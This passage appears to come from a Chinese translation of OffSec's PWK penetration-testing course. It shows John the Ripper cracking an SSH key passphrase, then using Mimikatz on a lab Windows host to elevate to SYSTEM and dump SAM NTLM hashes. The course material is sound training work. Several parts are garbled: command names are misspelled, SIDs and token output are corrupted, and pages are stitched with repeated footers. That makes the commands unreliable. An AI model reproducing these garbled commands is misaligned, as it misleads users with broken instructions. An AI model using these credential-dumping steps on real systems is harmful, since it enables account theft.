
> ⁴⁰(Hashcat 论坛, 2022), https://hashcat.net/forum/thread-10662.html

> ⁴¹(Wikipedia, 2022), https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CTR

PWK - 版权所有 2023 OffSec Services Limited. 保留所有权利。

# 列表 287 - 将规则添加到 JTR 配置文件

现在我们已成功将 `sshRules` 添加到 JTR 配置文件中，可以使用 `John` 在我们方法论的最后一步中破解口令。我们将通过 `wordlist=ssh.passwords` 定义字典列表，通过 `--rules=sshRules` 选择之前创建的规则，并将口令的哈希作为键参数 `ssh.hash` 提供。

```
kali@:/passwordattacks$ John --wordlist=ssh.passwords --rules=sshRules ssh.hash
```

Using default input encoding: UTF-8

Loaded 1 password (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

Cost 1 (ROD/cipher:MD5/AES 1-MD5/2-BCrypt/AES)) is 2 for all loaded hashes

Cost 2 (iteration) is 16 for all loaded hashes

will run 4 threads

Press 'q' 或 Ctrl-c 取消，按任意键查看状态

Umbrella17! (?)

IG 0:08:00:00 DONE (2022-05-02) (2022-05-02)

> ⁴⁰(Hashcat Forum, 2022), https://hashcat.net/forum/thread-10662.html

> ⁴¹(Wikipedia, 2022), https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CTR

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

使用 Kali Linux 进行渗透测试

这需要 `SeImpersonatePrivilege`⁶⁸ 访问权限才能工作，但所有本地管理员默认都拥有该权限。

现在我们已经对 NTLM 哈希值以及我们在哪里可以找到它们有了基本的了解，让我们来演示如何获取并破解这些哈希。

我们将从 IP 为 `192.168.50.210` 的 `MARKETINGWK01` 机器的 SAM 中提取密码。我们可以通过 `offsec` 使用 RDP 登录系统，并使用 `lab` 作为密码。

我们将使用 `Get-LocalUser`⁶⁹ 来检查系统上存在哪些用户。

```
PS C:\users\offsec>
```

| Name | Enabled | Description |
|---|------|
| Administrator | False | 用于管理计算机/域的内置账户 |
| DefaultAccount | False | 由系统管理的用户账户 |
| Guest | False | 用于访客访问计算机/域的内置账户 |
| nelly | True | |
| offsec | True | |
| WDAGUtilityUtilityAccount | False | 由系统管理并用于 Defender 应用场景...的用户账户 |

列表 290 - 在 PowerShell 中显示所有本地用户

290 的输出表明 `MARKETINGWK01` 系统上存在另一个名为 `nelly` 的用户。我们此节的目标是通过取回 NTLM 哈希并破解它来获取 `nelly` 的明文密码。

我们已经知道用户在登录 Windows 系统时会存储凭据，但凭据也会以其他方式存储。例如，当服务以用户账户运行时运行时，凭据也会被存储。

我们将使用 `Mimikatz`（位于 `C:\tools\mimikatz.exe`）来检查系统上存储的凭据。点击任务栏上的 Windows 图标并输入“powershell”，以管理员身份启动 PowerShell。如如下所示，我们将选择 PowerShell 并点击“以管理员身份运行”。我们将通过点击“是”来确认用户账户控制 (UAC) 弹出窗口。

⁶⁸ (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege

⁶⁹ (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localuser

# OffSec 使用 Kali Linux 进行渗透测试

![](img/336d6ea891e7464f18ad64426619ced4_411_0.png)

在 PowerShell 窗口中，我们将切换到 `C:\tools` 并启动 `Mimikatz`。

```
PS C:\Windows\system32> cd C:\tools

PS C:\tools> ls

Directory: C:\tools

| Mode | LastWriteTime | Name |
| --- | --- | --- |
| -a | 5/31/2022 12:25 PM | 1355680 mimikatz.exe |

PS C:\tools> ./mimikatz.exe
```

mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53

# ^^ A ^ #. "A La Vie, A L'Amour" 'gentilkiwi' ( benjamin@gentilkiwi.com )

# / \ # / /*** Benjamin DELPY 'gentilkiwi'

# / \ # / > http://blog.mimikatz.com/mimikatz

'#' V V'#' > ( vincent.letoux@gmail.com )

'####'

> VINCENT TOUCX

> https://pingcastle.com / https://mysmartlogon.com ***

```
mimikatz #
```

列表 291 - 启动 Mimikatz

# 使用 Kali Linux 进行渗透

根据提示符，`Mimikatz` 正在运行，我们可以通过命令行环境进入。每个命令由两个冒号组成，例如 `privilege:debug`。我们可以使用各种命令从系统中提取密码。`Mimikatz` 最常用的命令之一是 `sekurlsa:logwords`，它尝试从所有可用源提取明文密码和哈希。由于这会产生大量输出，我们将使用 `lsadump:sam` 从 SAM 中提取 NTLM 哈希。对于这一点，我们必须首先通过 `token:elevate` 进入 SYSTEM 权限。对于 `sekurlsa:logwords` 和 `lsadump:sam` 两个命令，我们必须启用 SeDePrivilege 权限，我们将通过 `privilege:debug` 完成。

```
mimikatz # privilege:debug

Privilege '0' OK

mimikatz # token::elevate

Token Id : 0

User name :
```

```
656 (000003e7) 1 D34811 AUTHORITY\SYSTEM S-1-55-18

(04g,2pi) Primary

--> Impersonated

* Token : (0004a1a0) 1 F646616 MARKETINGWK01@offsec S-1-25-21

42463932-229635194-3358240 (14g,24) Primary

* Token : (000803e7) 1 D621721 AUTHORITY\SYSTEM S-1-55-18

(04g,2pi) Impersonation (Delegation)
```
